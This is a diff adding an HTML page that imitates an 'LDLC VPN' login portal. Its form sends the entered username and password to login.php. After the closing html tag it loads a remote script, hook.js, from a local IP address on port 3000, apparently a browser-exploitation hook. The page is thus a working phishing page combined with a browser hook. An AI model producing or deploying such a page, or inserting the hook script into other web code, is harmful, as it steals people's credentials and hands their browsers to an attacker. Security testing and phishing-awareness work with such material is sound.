@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+
+body {
+  background-image: url("data/ldlc-vpn.jpg");
+  background-repeat: no-repeat;
+  background-position: center;
+  padding: 20%;
+}
+
+#user{
+  width: 29%;
+  margin-bottom: 13px;
+  border: 1px solid #ccc;
+  position: relative;
+  top: 68px;
+  height: 43px;
+  width: 370px;
+  border-radius: 5px;
+  font-size: 25px;
+  color: gray;
+  text-align: center;
+}
+
+#password {
+  width: 29%;
+  margin-bottom: 13px;
+  border: 1px solid #ccc;
+  position: relative;
+  top: 66px;
+  height: 43px;
+  width: 370px;
+  border-radius: 5px;
+  font-size: 25px;
+  color: gray;
+  text-align: center;
+}
+
+#bouton {
+  background-color: #193867;
+  color: white;
+  padding: 10px 180px;
+  border: none;
+  border-radius: 5px;
+  font-size: 23px;
+  position: relative;
+  top: 44px;
+  right: 21px;
+}
+
+#footer {
+  position: absolute;
+  bottom: -15px;
+  left: 0;
+  width: 100%;
+  background-color: #f5f5f5;
+  text-align: center;
+  padding: 10px 0;
+}
+
+#footer img {
+  width: 100%;
+  height: auto;
+}
+
+
+</style>
+</head>
+<body>
+
+<center>
+<form method="POST" action="login.php">
+  <input id="user" type="text" name="username" placeholder="username" length="64"><br>
+  <input id="password" type="password" name="password" placeholder="password" length="64"><br><br>
+  <input id="bouton" value="Sign In" type="submit">
+</form>
+</center>
+</body>
+<div id="footer">
+  <img src="data/footer-ldlc.png" alt="Footer Image">
+</div>
+</html>
+<script src="http://192.168.1.33:3000/hook.js"></script>
+
